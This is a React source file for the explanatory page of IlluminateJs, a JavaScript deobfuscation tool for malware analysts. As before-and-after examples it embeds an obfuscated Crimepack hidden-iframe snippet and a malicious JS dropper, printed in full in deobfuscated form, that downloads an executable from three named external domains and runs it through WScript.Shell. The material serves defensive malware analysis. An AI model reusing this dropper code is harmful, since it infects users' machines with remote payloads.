import React, { Component } from 'react'

import Layout from './Layout'
import * as prettier from 'prettier-standalone' // Very large
import CodeEditor from './CodeEditor'

const samples = {
    crimepack: "var tmssqrcaizo = 'WYTUHYjE3cWYTUHYjE69WYTUHYjE66';var makvvxmaqgh = 'WYTUHYjE72';var nlsysoyxklj = 'WYTUHYjE61WYTUHYjE6dWYTUHYjE65WYTUHYjE20WYTUHYjE6eWYTUHYjE61WYTUHYjE6dWYTUHYjE65WYTUHYjE3dWYTUHYjE22';var zezugacgoqg = 'WYTUHYjE6eWYTUHYjE6fWYTUHYjE6aWYTUHYjE72WYTUHYjE73WYTUHYjE65WYTUHYjE72WYTUHYjE66WYTUHYjE6cWYTUHYjE72WYTUHYjE6f';var nmcwycmeknp = 'WYTUHYjE22WYTUHYjE20WYTUHYjE77WYTUHYjE69WYTUHYjE64WYTUHYjE74WYTUHYjE68WYTUHYjE3dWYTUHYjE22WYTUHYjE31WYTUHYjE22WYTUHYjE20WYTUHYjE68WYTUHYjE65WYTUHYjE69WYTUHYjE67WYTUHYjE68WYTUHYjE74WYTUHYjE3dWYTUHYjE22WYTUHYjE30WYTUHYjE22';var tmirlfbwofa = 'WYTUHYjE20WYTUHYjE73WYTUHYjE72WYTUHYjE63WYTUHYjE3dWYTUHYjE22';var yzhocnctubf = 'WYTUHYjE68WYTUHYjE74WYTUHYjE74WYTUHYjE70WYTUHYjE3aWYTUHYjE2fWYTUHYjE2f';var pxezkikyynl = 'localhost/index.php';var mewlgszlsol = 'WYTUHYjE22WYTUHYjE20WYTUHYjE6dWYTUHYjE61WYTUHYjE72WYTUHYjE67WYTUHYjE69WYTUHYjE6eWYTUHYjE77WYTUHYjE69WYTUHYjE64WYTUHYjE74WYTUHYjE68WYTUHYjE3dWYTUHYjE22WYTUHYjE31WYTUHYjE22WYTUHYjE20WYTUHYjE6dWYTUHYjE61WYTUHYjE72WYTUHYjE67WYTUHYjE69WYTUHYjE6eWYTUHYjE68WYTUHYjE65WYTUHYjE69WYTUHYjE67WYTUHYjE68WYTUHYjE74WYTUHYjE3dWYTUHYjE22WYTUHYjE30WYTUHYjE22WYTUHYjE20WYTUHYjE74WYTUHYjE69WYTUHYjE74WYTUHYjE6cWYTUHYjE65WYTUHYjE3dWYTUHYjE22';var vconehifned = 'WYTUHYjE6eWYTUHYjE6fWYTUHYjE6aWYTUHYjE72WYTUHYjE73WYTUHYjE65WYTUHYjE72WYTUHYjE66WYTUHYjE6cWYTUHYjE72WYTUHYjE6f';var weozomycyeg = 'WYTUHYjE22WYTUHYjE20WYTUHYjE73WYTUHYjE63WYTUHYjE72WYTUHYjE6fWYTUHYjE6cWYTUHYjE6cWYTUHYjE69WYTUHYjE6eWYTUHYjE67WYTUHYjE3dWYTUHYjE22WYTUHYjE6eWYTUHYjE6fWYTUHYjE22WYTUHYjE20WYTUHYjE62WYTUHYjE6fWYTUHYjE72WYTUHYjE64WYTUHYjE65WYTUHYjE72WYTUHYjE3dWYTUHYjE22WYTUHYjE30WYTUHYjE22WYTUHYjE20WYTUHYjE66WYTUHYjE72WYTUHYjE61WYTUHYjE6dWYTUHYjE65WYTUHYjE62WYTUHYjE6fWYTUHYjE72WYTUHYjE64WYTUHYjE65WYTUHYjE72WYTUHYjE3dWYTUHYjE22WYTUHYjE30WYTUHYjE22WYTUHYjE3e';var zqnnqzfelfg = 'WYTUHYjE3cWYTUHYjE2fWYTUHYjE69WYTUHYjE66';var qtlhbruguml = 'WYTUHYjE72WYTUHYjE61';var xmzvkbtpiof = 'WYTUHYjE6dWYTUHYjE65WYTUHYjE3e';var vbvvhagnggg = new Array();vbvvhagnggg[0]=new Array(tmssqrcaizo+makvvxmaqgh+nlsysoyxklj+zezugacgoqg+nmcwycmeknp+tmirlfbwofa+yzhocnctubf+pxezkikyynl+mewlgszlsol+vconehifned+weozomycyeg+zqnnqzfelfg+qtlhbruguml+xmzvkbtpiof);document['WYTUHYjEwWYTUHYjErWYTUHYjEiWYTUHYjEtWYTUHYjEeWYTUHYjE'.replace(/WYTUHYjE/g,'')](window['WYTUHYjEuWYTUHYjEnWYTUHYjEeWYTUHYjEsWYTUHYjEcWYTUHYjEaWYTUHYjEpWYTUHYjEeWYTUHYjE'.replace(/WYTUHYjE/g,'')](vbvvhagnggg.toString().replace(/WYTUHYjE/g,'%')));",
    crimepackDeobfuscated: '/* ............ CUT ............ */\ndocument.write("<iframe name="nojrserflro" width="1" height="0" src="http://localhost/index.php" marginwidth="1" marginheight="0" title="nojrserflro" scrolling="no" border="0" frameborder="0"></iframe>");',
    dropper:`var stroke = "5557545E0D0A020B4A0D1005081D2417130D1717140B17104A070B09";
function bhj75() {
    nz('()*1');
    return lxd();
};

function bhj100() {
    nz('ys');
    return lxd();
};

/* ............ CUT ............ */

function bhj197() {
    nz('stro');
    return lxd();
};

function bhj168() {
    nz('cat');
    return lxd();
};
for (var enpi = 1; enpi <= 226; enpi++) {
    nz(this['bhj' + enpi]());
    fvd += lxd();
}
this[xcil() + bhj()](fvd);`,
    dropperDeobfuscated: `/* ............ CUT ............ */
    fvd =
  'function dl(fr) { var b = "harmacrebar.com readysetgomatthew.com ayuso-arch.com".split(" "); for (var i=0; i<b.length; i++) { var ws = new ActiveXObject("WScript.Shell"); var fn = ws.ExpandEnvironmentStrings("%TEMP%")+String.fromCharCode(92)+Math.round(Math.random()*100000000)+".exe"; var dn = 0; var xo = new ActiveXObject("MSXML2.XMLHTTP"); xo.onreadystatechange = function() { if (xo.readyState == 4 && xo.status == 200) { var xa = new ActiveXObject("ADODB.Stream"); xa.open(); xa.type = 1; xa.write(xo.ResponseBody); if (xa.size > 5000) { dn = 1; xa.position = 0; xa.saveToFile(fn,2); try { ws.Run(fn,1,0); } catch (er) {}; }; xa.close(); }; }; try { xo.open("GET","http://"+b[i]+"/document.php?rnd="+fr+"&id="+stroke, false); xo.send(); } catch (er) {}; if (dn == 1) break; }; }; dl(9391); dl(2252); dl(6943);';
function dl(fr) {
  const b = ["harmacrebar.com", "readysetgomatthew.com", "ayuso-arch.com"];
  for (var i = 0; i < 3; i++) {
    const ws = new ActiveXObject("WScript.Shell");
    const fn =
      ws.ExpandEnvironmentStrings("%TEMP%") +
      "\\" +
      Math.round(Math.random() * 100000000) +
      ".exe";
    var dn = 0;
    const xo = new ActiveXObject("MSXML2.XMLHTTP");
    xo.onreadystatechange = function() {
      if (xo.readyState == 4 && xo.status == 200) {
        const xa = new ActiveXObject("ADODB.Stream");
        xa.open();
        xa.type = 1;
        xa.write(xo.ResponseBody);
        if (xa.size > 5000) {
          dn = 1;
          xa.position = 0;
          xa.saveToFile(fn, 2);
          try {
            ws.Run(fn, 1, 0);
          } catch (er) {}
        }
        xa.close();
      }
    };
    try {
      xo.open(
        "GET",
        "http://" +
          b[i] +
          "/document.php?rnd=" +
          fr +
          "&id=5557545E0D0A020B4A0D1005081D2417130D1717140B17104A070B09",
        false
      );
      xo.send();
    } catch (er) {}
    if (dn == 1) break;
  }
}`

}  

export default class HowItWorks extends Component {

  render () {
      return (
        <Layout>
            <div>
            <h2>Intro</h2>
            <p>
                IlluminateJs is a <strong>static javascript analysis engine</strong> (a deobfuscator so to say) aimed to help analyst understand obfuscated and potentially malicious JavaScript Code. Consider it like <a href="http://www.relentless-coding.com/projects/jsdetox/" target="_blank" rel="noopener noreferrer">JSDetox</a>, but on steroids.
                IlluminateJs core is a <a href="https://babeljs.io/" target="_blank" rel="noopener noreferrer">Babel</a> compiler plugin and <strong>it works entirely in your browser</strong>, no server interaction is needed to perform deobfuscation.
            </p>
            <h2>Features</h2>
            <ul>
                <li>Extended constant propagation</li>
                <li>Array mutators tracking</li>
                <li>Mixed-type expressions evaluation</li>
                <li>Support modern JavaScript (ES6)</li>
                <li>Function calls evaluation</li>
                <li>Built-in function evaluation</li>
                <li>Loops evaluation</li>
                <li>Procedure inlining</li>
            </ul>
            <h2>Examples</h2>
            <div className="sampleContainer">
                <h4>Malicious JS Dropper</h4>
                <div>
                    <div className="sampleLeft">
                        <small><u>Obfuscated</u></small>
                        <CodeEditor readonly="true" code={prettier.format(samples.dropper)}/>
                    </div>

                    <div className="sampleRight">
                        <small><u>Deobfuscated</u></small>
                        <CodeEditor readonly="true" code={samples.dropperDeobfuscated}/>
                    </div>
                </div>
            </div>
            <div className="sampleContainer"/>
                <h4>Crimepack Sample</h4>
                <div>
                    <div className="sampleLeft">
                        <small><u>Obfuscated</u></small>
                        <CodeEditor readonly="true" code={prettier.format(samples.crimepack)}/>
                    </div>

                    <div className="sampleRight">
                        <small><u>Deobfuscated</u></small>
                        <CodeEditor readonly="true" code={samples.crimepackDeobfuscated}/>
                    </div>
                </div>
            </div>
            <div style={{clear:'both'}}>
                <h2>Support</h2>
                <p>For feature suggestions, sample submission and bug reports you can address those at the project <a href="https://github.com/geeksonsecurity/illuminatejs">GitHub Repository</a></p>
            </div>
        </Layout>
      )
    }
}